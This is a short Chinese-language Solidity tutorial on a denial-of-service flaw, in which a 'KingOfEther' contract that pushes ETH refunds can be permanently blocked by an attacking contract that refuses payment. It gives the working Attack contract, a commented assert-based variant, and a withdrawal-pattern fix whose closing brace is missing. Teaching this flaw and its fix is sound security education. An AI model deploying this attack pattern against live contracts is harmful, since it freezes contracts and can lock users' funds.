# 拒绝服务

通过发送eth失败是实现拒绝服务

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/*
KingOfEther 的目标是通过发送更多的 ETH 成为国王。
前国王将退还以太币数量
*/

/*
1. 部署 合约
2. alice 发送 1 eth 成为 king
3. bob 发送 2 eth 成为ing. alice 接收到退还 1 eth
4. 部署 attck
5. 调用 attack 使用 3 eth
6. attact 成为king, 同时 没有人成为新的king


发生了什么？

所有成为king的新挑战都将被拒绝.因为attack 没有 fallback 函数，拒绝接受ether.
*/

contract KingOfEther {
    address public king;
    uint public balance;

    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");

        (bool sent, ) = king.call{value: balance}("");
        require(sent, "Failed to send Ether");

        balance = msg.value;
        king = msg.sender;
    }
}

contract Attack {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    // 您还可以通过使用 assert 消耗所有气体来执行 DOS。
    // This attack will work even if the calling contract does not check
    // whether the call was successful or not.
    //
    // function () external payable {
    //     assert(false);
    // }

    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}
```



### 预防技术

防止这种情况的一种方法是允许用户提取他们的eth而不是发送它。

使用提款模式：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract KingOfEther {
    address public king;
    uint public balance;
    mapping(address => uint) public balances;

    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");

        balances[king] += balance;

        balance = msg.value;
        king = msg.sender;
    }

    function withdraw() public {
        require(msg.sender != king, "Current king cannot withdraw");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
```

